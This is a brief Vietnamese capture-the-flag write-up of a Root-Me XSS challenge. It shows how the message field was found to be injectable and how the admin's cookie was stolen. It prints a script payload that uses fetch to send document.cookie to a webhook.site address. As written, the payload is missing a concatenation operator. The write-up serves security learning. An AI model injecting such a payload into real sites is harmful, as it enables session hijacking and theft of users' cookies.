Challenge: http://challenge01.root-me.org/web-client/ch18/

Đầu tiên truy cập web và thử với input an toàn: 
![alt text](image.png)
![alt text](image-1.png)

Lần lượt thử xem phần Title hay Message bị XSS:
![alt text](image-2.png)
![alt text](image-3.png)

![alt text](image-4.png)
![alt text](image-5.png)

Vậy ở đây ta rút ra được phần Message bị XSS.

Vì mục đích là lấy được cookie phía admin, nên cần phải gửi document.cookie từ phía máy chủ. 

Dùng webhook để nhận gói tin:
![alt text](image-7.png)

```
<script>fetch('https://webhook.site/07a827ce-9a71-4727-8c68-3381bd0cc939/' encodeURI(document.cookie), {method: 'GET'});</script>
```
Ta nhận được gói tin bên webhook:
![alt text](image-8.png)

